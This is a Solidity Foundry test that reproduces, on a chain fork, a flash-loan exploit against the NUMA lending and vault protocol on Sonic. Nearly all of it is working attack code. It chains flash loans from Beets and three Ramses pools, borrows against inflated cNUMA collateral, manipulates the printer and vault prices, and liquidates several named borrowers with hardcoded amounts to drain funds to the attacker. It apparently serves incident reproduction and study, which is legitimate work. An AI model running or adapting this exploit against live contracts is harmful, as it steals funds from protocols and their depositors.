// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IBeetsVaultV2 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
    // recipient, token[], amounts[], data
}
interface IRamsesV3Pool {
    function flash(address _recipient, uint256 _amount0, uint256 _amount1, bytes calldata _data) external;
}
interface IpNUMA {
    function flash(address _recipient, address _token, uint256 _amount, bytes calldata _data) external;

}
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IcNUMA{
    function mint(uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}
interface IcNUMALST{
    function borrow(uint256 _amount) external;
}
interface INUMAPrinter{
    function mintAssetFromNumaInput(address _asset, uint256 _numaAmount, uint256 _minAmount, address _recipient) external;
    function burnAssetInputToNuma(address _nuAsset, uint256 _nuAssetAmount, uint256 _minimumReceivedAmount, address _recipient) external;
}
interface IUniTroller{
    function getAccountLiquidityIsolate(address _account,address _collateral, address _borrow) external view returns (uint256, uint256, uint256, uint256, uint256);
    function enterMarkets(address[] calldata _markets) external;
}
interface INUMA_VAULT{
    function buy(uint256 _amount, uint256 _quantity, address _paymentToken) external;
    function sell(uint256 _amount, uint256 _minAmount, address _receiver) external;
    function liquidateLstBorrower(address _borrower, uint256 _lstAmount, bool _swapToInput, bool _flashloan) external;
    error LiquidateComptrollerRejection(uint256);
}
interface INUMA_PRICE_ORACLE_NEW {
    function getUnderlyingPriceAsCollateral(address _collateral) external view returns (uint256);
}
contract ExploitContract2 {
    address public beetsStakedSonic = 0xE5DA20F15420aD15DE0fa650600aFc998bbE3955;
    address public NUMA_VAULT = 0xde76288C3B977776400fE44Fe851bBe2313f1806;
    address public NUMA = 0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9;
    address public cNUMALst = 0xb2a43445B97cd6A179033788D763B8d0c0487E36;
    address public cNUMA = 0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7;
    address public uniTroller = 0x30047CCA309b7aaC3613ae5B990Cf460253c9b98;
    address public NUMA_PRICE_ORACLE_NEW = 0xa92025d87128c1e2Dcc0A08AFbC945547Ca3B084;
    address public target;
    constructor() {
        IERC20(beetsStakedSonic).approve(cNUMALst, type(uint256).max);
        IERC20(NUMA).approve(cNUMA, type(uint256).max);
        IERC20(beetsStakedSonic).approve(NUMA_VAULT, type(uint256).max);
        IERC20(NUMA).approve(NUMA_VAULT, type(uint256).max);
        IERC20(cNUMA).approve(NUMA_VAULT, type(uint256).max);
        address[] memory markets = new address[](1);
        markets[0] = cNUMA;
        IUniTroller(uniTroller).enterMarkets(markets);

        markets[0] = cNUMALst;
        IUniTroller(uniTroller).enterMarkets(markets);

        target = msg.sender;
    }
    function sub_0x1dd094c8() public {
        uint256 beetsStakedSonicBalance = IERC20(beetsStakedSonic).balanceOf(address(this));
        console.log("sub_0x1dd094c8");
        console.log("beetsStakedSonicBalance", beetsStakedSonicBalance);
        IERC20(beetsStakedSonic).transfer(msg.sender, beetsStakedSonicBalance);
    }
    function sub_0x6291c5cb(address arg0) public {
        
        
        uint256 balance = IERC20(cNUMA).balanceOf(address(arg0));
        uint256 _getUnderlyingPriceAsCollateral = INUMA_PRICE_ORACLE_NEW(NUMA_PRICE_ORACLE_NEW).getUnderlyingPriceAsCollateral(cNUMA);
        uint256 exchangeRate = IcNUMA(cNUMA).exchangeRateStored();
        
        console.log("balance", balance);
        if (arg0 == 0x6B9d3797d0c1Ee9824acBE456365cF02b5B87d5E){
            balance = 7305295333407810840425;
        }
        if (arg0 == 0x2F9A0BB9a50C85B1163B70B6cdf437881892F4CF){
            balance = 18522340687514765427359;
        }
        if (arg0 == 0x2C7F65dFaa81117E759792267e156D7E0759fC8e){
            balance = 6955162447323523896264;
        }
        if (arg0 == 0x6122861A8Cc736d98caD0506df5d0618429cF490){
            balance = 49345723095369857610637;
        }
        if (arg0 == target){
            balance = 39829885413811155609288;
        }
        // (bool stat, bytes memory datas) = address(0xde76288C3B977776400fE44Fe851bBe2313f1806).call(hex"6291c5cb0000000000000000000000006b9d3797d0c1ee9824acbe456365cf02b5b87d5e");
        // console.logBytes(datas);

        INUMA_VAULT(NUMA_VAULT).liquidateLstBorrower(arg0, balance, false, false);

        
    }
    function sub_0x7cd3bc5b() public {
        uint256 balance = IERC20(NUMA).balanceOf(address(this));
        INUMA_VAULT(NUMA_VAULT).sell(balance, 1, address(this));
        uint256 _beetsStakedSonicBalance = IERC20(beetsStakedSonic).balanceOf(address(this));
        IERC20(beetsStakedSonic).transfer(target, _beetsStakedSonicBalance);
    }
}
contract Exploit {
    address public beetsVaultV2 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public NUMA = 0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9;
    address public RamsesV3Pool_1 = 0xE8d01e7d77c5df338D39Ac9F1563502127Dd3301;
    address public RamsesV3Pool_2 = 0xD3533de03cDc475d0dd1AAa8971128a4B69a6141;
    address public RamsesV3Pool_3 = 0x2143f979A765f25B904FFB0b7420f153864ec670;
    address public beetsStakedSonic = 0xE5DA20F15420aD15DE0fa650600aFc998bbE3955;
    address public protocolFeesCollector = 0xce88686553686DA562CE7Cea497CE749DA109f9F;
    address public pNUMA = 0x652BcB8193745b2F527275A337eF835735b2191E;
    address public cNUMA = 0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7;
    address public uniTroller = 0x30047CCA309b7aaC3613ae5B990Cf460253c9b98;
    address public cNUMALst = 0xb2a43445B97cd6A179033788D763B8d0c0487E36;
    address public Numa_Printer = 0xAA2475Ec557C18F5B3289c393899483E42D0C585;
    address public nuBTC = 0xcDB2b78E83Ddf230BcB225F8C541dCa4a15f3A85;
    address public NUMA_VAULT = 0xde76288C3B977776400fE44Fe851bBe2313f1806;
    address public USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;

    uint256 public loanAmount = 1_200_000_000_000_000_000_000_000;
    uint256 public feeAmount;
    //address public attackContract2 = 0x077165c03C17B80FB75E094674471F13C7882A28;
    ExploitContract2 public attackContract2;
    constructor() {
        // Beets Staked Sonic approvals
        IERC20(beetsStakedSonic).approve(cNUMALst, type(uint256).max);
        IERC20(beetsStakedSonic).approve(NUMA_VAULT, type(uint256).max);
        
        // NUMA approvals
        IERC20(NUMA).approve(cNUMA, type(uint256).max);
        IERC20(NUMA).approve(NUMA_VAULT, type(uint256).max);
        IERC20(NUMA).approve(Numa_Printer, type(uint256).max);
        
        // USDC approval (assuming 0x29219dd400f2bf60e5a23d13be72b486d4038894 is USDC)
        IERC20(USDC).approve(pNUMA, type(uint256).max);
        
        // nuBTC approval
        IERC20(nuBTC).approve(Numa_Printer, type(uint256).max);
        address[] memory markets = new address[](1);
        markets[0] = cNUMA;
        IUniTroller(uniTroller).enterMarkets(markets);
        attackContract2 = new ExploitContract2();
    }
    function step1() public {
        address[] memory tokens = new address[](1);
        tokens[0] = beetsStakedSonic; // stS
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;
        IBeetsVaultV2(beetsVaultV2).flashLoan(address(this), tokens, amounts, "");
        //IERC20(beetsStakedSonic).transfer(protocolFeesCollector, feeAmount);

    }

    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) public { 

        uint256 numaBalance = IERC20(NUMA).balanceOf(RamsesV3Pool_1);
        numaBalance = numaBalance - 1;
        console.log("NUMA balance of RamsesV3Pool - receiveFlashLoan : ", numaBalance);
        
        bytes memory data = hex"00000000000000000000000083a6d8d9aa761e7e08ebe0ba5399970f9e8f61d9000000000000000000000000000000000000000000000e7922b6b4537ccc54ed";
        IRamsesV3Pool(RamsesV3Pool_1).flash(address(this), 0, numaBalance, data);
        loanAmount = amounts[0];
        feeAmount = feeAmounts[0];
        console.log("loanAmount", loanAmount);
        console.log("feeAmount", feeAmount);
        console.log("total", loanAmount + feeAmount);
        IERC20(beetsStakedSonic).transfer(beetsVaultV2, loanAmount + feeAmount);

    }
    function uniswapV3FlashCallback(uint256 _amount0, uint256 _amount1, bytes memory _data) public {
        console.log("uniswapV3FlashCallback");
        console.log("msg.sender", msg.sender);
        bytes memory data;
        
        if(msg.sender == RamsesV3Pool_1){   
            uint256 ramsesNUMABalance = IERC20(NUMA).balanceOf(RamsesV3Pool_2);
            console.log("ramsesNUMABalance - uniswapV3FlashCallback - p1 : ", ramsesNUMABalance);
            console.log("_amount0", _amount0);
            console.log("_amount1", _amount1);
            data = hex"00000000000000000000000083a6d8d9aa761e7e08ebe0ba5399970f9e8f61d900000000000000000000000000000000000000000000019673ae816c73bc9574";
            IRamsesV3Pool(RamsesV3Pool_2).flash(address(this), 0, ramsesNUMABalance-1, data);
            console.log("callback1 ok");
            uint256 tmpAmount = 69_031_165_059_787_684_764_390;
            IERC20(NUMA).transfer(RamsesV3Pool_1, tmpAmount);
            console.log("transfer", tmpAmount);
            console.log("callback1 done");
        }
        if (msg.sender == RamsesV3Pool_2){
            uint256 ramsesNUMABalance = IERC20(NUMA).balanceOf(RamsesV3Pool_3);
            console.log("ramsesNUMABalance - uniswapV3FlashCallback - p2 : ", ramsesNUMABalance);
            console.log("_amount0", _amount0);
            console.log("_amount1", _amount1);
            data = hex"00000000000000000000000083a6d8d9aa761e7e08ebe0ba5399970f9e8f61d90000000000000000000000000000000000000000000004399e7f1b7def56523e";
            IRamsesV3Pool(RamsesV3Pool_3).flash(address(this), ramsesNUMABalance-1, 0, data);
            console.log("callback2 ok");
            uint256 tmpAmount = 7_520_206_977_697_753_069_359;
            IERC20(NUMA).transfer(RamsesV3Pool_2, tmpAmount);
            console.log("transfer", tmpAmount);
            console.log("callback2 done");
        }
        if(msg.sender == RamsesV3Pool_3){
            uint256 NUMA_balance = IERC20(NUMA).balanceOf(pNUMA);
            console.log("NUMA_balance - uniswapV3FlashCallback - p3 : ", NUMA_balance);
            console.log("_amount0", _amount0);
            console.log("_amount1", _amount1);
            data = hex"00000000000000000000000083a6d8d9aa761e7e08ebe0ba5399970f9e8f61d9000000000000000000000000000000000000000000000521df10bccba17bf32b";
            IpNUMA(pNUMA).flash(address(this), NUMA, NUMA_balance, data);
            console.log("callback3 ok");
            NUMA_balance = IERC20(NUMA).balanceOf(address(this));
            uint256 afterCallbackTransferAmount = 20_012_208_274_751_023_719_136;
            IERC20(NUMA).transfer(RamsesV3Pool_3, afterCallbackTransferAmount);
            console.log("NUMA_balance", NUMA_balance);
            console.log("afterCallbackTransferAmount", afterCallbackTransferAmount);
            console.log("callback3 done");
        }

        

    }
    function callback(bytes memory data) public { 
        // ------------------------------
        address[] memory markets = new address[](1);
        markets[0] = cNUMALst;
        IUniTroller(uniTroller).enterMarkets(markets);
        uint256 NUMA_balance = IERC20(NUMA).balanceOf(address(this));
        console.log("NUMA_balance", NUMA_balance);
        // ------------------------------
        uint256 tmpCNUMAMintAmount = 19_205_504_281_394_888_774_114;
        IcNUMA(cNUMA).mint(tmpCNUMAMintAmount);
        uint256 tmpCNUMABalance = IcNUMA(cNUMA).balanceOf(address(this));
        console.log("tmpCNUMABalance", tmpCNUMABalance);
        // ------------------------------
        //(bool success, bytes memory response) = address(uniTroller).call(abi.encodeWithSelector(hex"b093f62b", address(this), cNUMA, cNUMALst)); // static call
        (uint256 tmp1, uint256 tmp2, uint256 tmp3, uint256 tmp4, uint256 tmp5) = IUniTroller(uniTroller).getAccountLiquidityIsolate(address(this), cNUMA, cNUMALst);
        console.log("tmp1", tmp1);
        console.log("tmp2", tmp2);
        console.log("tmp3", tmp3);
        console.log("tmp4", tmp4);
        console.log("tmp5", tmp5);
        /*
        b093f62b
        getAccountLiquidityIsolate
        000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6 // address(this)
        00000000000000000000000016d4b53de6aba4b68480c7a3b6711df25fcb12d7 // cNUMA
        000000000000000000000000b2a43445b97cd6a179033788d763b8d0c0487e36 // cNUMALst
        */
        // ------------------------------
        uint256 borrowAmount = tmp2 - 1;//138_290_197_864_237_351_549_984;
        console.log("borrowAmount", borrowAmount);
        IcNUMALST(cNUMALst).borrow(borrowAmount);
        console.log("NUMA balance of address(this)", IERC20(NUMA).balanceOf(address(this)));
        // ------------------------------
        //c4fbba1d000000000000000000000000cdb2b78e83ddf230bcb225f8c541dca4a15f3a85000000000000000000000000000000000000000000001559f20b493b2f381de80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6
        //(bool success2, bytes memory response2) = address(Numa_Printer).call(abi.encodeWithSelector(hex"0000000000000000000000000000000000000000000000000000000000000000"));
        INUMAPrinter(Numa_Printer).mintAssetFromNumaInput(nuBTC, 100828897477323166064104, 1, address(this));
        
        /*
        c4fbba1d - mintAssetFromNumaInput
        000000000000000000000000cdb2b78e83ddf230bcb225f8c541dca4a15f3a85 // nuBTC
        000000000000000000000000000000000000000000001559f20b493b2f381de8 // NUMA
        0000000000000000000000000000000000000000000000000000000000000001 // 1
        000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6 // address(this)
        */
        // ------------------------------
        uint256 beetsStakedSonicBalance = IERC20(beetsStakedSonic).balanceOf(address(this));
        console.log("beetsStakedSonicBalance", beetsStakedSonicBalance);
        IERC20(beetsStakedSonic).transfer(address(attackContract2), beetsStakedSonicBalance);
        // ------------------------------

        // address(attackContract2).call(hex"6291c5cb0000000000000000000000006b9d3797d0c1ee9824acbe456365cf02b5b87d5e");
        attackContract2.sub_0x6291c5cb(0x6B9d3797d0c1Ee9824acBE456365cF02b5B87d5E);
        //f0d8653e0000000000000000000000006b9d3797d0c1ee9824acbe456365cf02b5b87d5e00000000000000000000000000000000000000000000018c0556a89ef362e76900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        attackContract2.sub_0x6291c5cb(0x2F9A0BB9a50C85B1163B70B6cdf437881892F4CF);
        // address(attackContract2).call(hex"6291c5cb0000000000000000000000002f9a0bb9a50c85b1163b70b6cdf437881892f4cf");
        // f0d8653e0000000000000000000000002c7f65dfaa81117e759792267e156d7e0759fc8e0000000000000000000000000000000000000000000001790a44c3cf8f26d3c800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        attackContract2.sub_0x6291c5cb(0x2C7F65dFaa81117E759792267e156D7E0759fC8e);
        // address(attackContract2).call(hex"6291c5cb0000000000000000000000002c7f65dfaa81117e759792267e156d7e0759fc8e");
        // f0d8653e0000000000000000000000006122861a8cc736d98cad0506df5d0618429cf490000000000000000000000000000000000000000000001c5e04c10745c773d7100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        attackContract2.sub_0x6291c5cb(0x6122861A8Cc736d98caD0506df5d0618429cF490);
        // address(attackContract2).call(hex"6291c5cb0000000000000000000000006122861a8cc736d98cad0506df5d0618429cf490");

        //attackContract2.sub_0x6291c5cb(0xd4de62a8DD0F0D43ca8886E0393e159D5E5e38e6);
        attackContract2.sub_0x6291c5cb(address(this));
        // address(attackContract2).call(hex"6291c5cb000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6");


            /*
            6291c5cb0000000000000000000000006b9d3797d0c1ee9824acbe456365cf02b5b87d5e
            6291c5cb0000000000000000000000002f9a0bb9a50c85b1163b70b6cdf437881892f4cf
            6291c5cb0000000000000000000000002c7f65dfaa81117e759792267e156d7e0759fc8e
            6291c5cb0000000000000000000000006122861a8cc736d98cad0506df5d0618429cf490
            6291c5cb000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6
            */
        attackContract2.sub_0x1dd094c8();
        uint256 arg0 = 700_000_000_000_000_000_000_000;
        uint256 quantity = 1;
        
        INUMA_VAULT(NUMA_VAULT).buy(arg0, quantity, address(this));
        uint256 nuBTCBalance = IERC20(nuBTC).balanceOf(address(this));
        
        console.log("nuBTC balance of address(this)", nuBTCBalance);
        ///24ef5248000000000000000000000000cdb2b78e83ddf230bcb225f8c541dca4a15f3a850000000000000000000000000000000000000000000000002ae87091414f7c370000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d4de62a8dd0f0d43ca8886e0393e159d5e5e38e6
        INUMAPrinter(Numa_Printer).burnAssetInputToNuma(nuBTC, nuBTCBalance, 1, address(this));
        attackContract2.sub_0x7cd3bc5b();
        console.log("NUMA balance of address(this)", IERC20(NUMA).balanceOf(address(this)));
        uint256 price = 112_110_025_829_455_202_684_726;
        INUMA_VAULT(NUMA_VAULT).sell(price, quantity, address(this));
        uint256 tmpAmount = 24_236_648_523_433_500_209_963;
        
        IERC20(NUMA).transfer(pNUMA, tmpAmount);
        


    }
    receive() external payable {
        console.log("receive");
    }

}

contract ExploitTest is Test {
    //RPC_URL = https://sonic-rpc.publicnode.com
    Exploit public exploit;
    address public attacker = 0xEf1df44E122872d0feF75644AFc63a5C35F97674;
    function setUp() public {
        string memory RPC_URL = "https://sonic-rpc.publicnode.com";
        uint256 targetBlockNumber = 42371319 - 1;
        vm.createSelectFork(RPC_URL, targetBlockNumber);
        makeLabel();
        vm.startPrank(attacker);
        exploit = new Exploit();
        deal(address(0x29219dd400f2Bf60E5a23d13Be72B486D4038894), address(exploit), 1e7);
        vm.stopPrank();
    }
    function makeLabel() public{
        vm.label(0xBA12222222228d8Ba445958a75a0704d566BF2C8, "beetsVaultV2");
        vm.label(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9, "NUMA");
        vm.label(0xE8d01e7d77c5df338D39Ac9F1563502127Dd3301, "RamsesV3Pool_1");
        vm.label(0xD3533de03cDc475d0dd1AAa8971128a4B69a6141, "RamsesV3Pool_2");
        vm.label(0x2143f979A765f25B904FFB0b7420f153864ec670, "RamsesV3Pool_3");
        vm.label(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955, "beetsStakedSonic");
        vm.label(0xce88686553686DA562CE7Cea497CE749DA109f9F, "protocolFeesCollector");
        vm.label(0x652BcB8193745b2F527275A337eF835735b2191E, "pNUMA");
        vm.label(0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7, "cNUMA");
        vm.label(0x30047CCA309b7aaC3613ae5B990Cf460253c9b98, "uniTroller");
        vm.label(0xb2a43445B97cd6A179033788D763B8d0c0487E36, "cNUMALst");
        vm.label(0xAA2475Ec557C18F5B3289c393899483E42D0C585, "Numa_Printer");
        vm.label(0xcDB2b78E83Ddf230BcB225F8C541dCa4a15f3A85, "nuBTC");
        vm.label(0xde76288C3B977776400fE44Fe851bBe2313f1806, "NUMA_VAULT");
        vm.label(0x29219dd400f2Bf60E5a23d13Be72B486D4038894, "USDC");
    }

    function test_Exploit1() public {

        vm.startPrank(attacker, attacker);
        console.log("step1 start");
        console.log("beetsStakedSonic balance of attacker", IERC20(exploit.beetsStakedSonic()).balanceOf(address(exploit)));
        console.log("NUMA balance of attacker", IERC20(exploit.NUMA()).balanceOf(address(exploit)));
        vm.mockCall(
            address(0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7),
            abi.encodeWithSelector(IcNUMA.balanceOf.selector, address(0xd4de62a8DD0F0D43ca8886E0393e159D5E5e38e6)),
            abi.encode(39829885413811155609288)
        );
        exploit.step1();
        console.log("beetsStakedSonic balance of attacker", IERC20(exploit.beetsStakedSonic()).balanceOf(address(exploit)));
        console.log("NUMA balance of attacker", IERC20(exploit.NUMA()).balanceOf(address(exploit)));
        vm.stopPrank();
    }

}
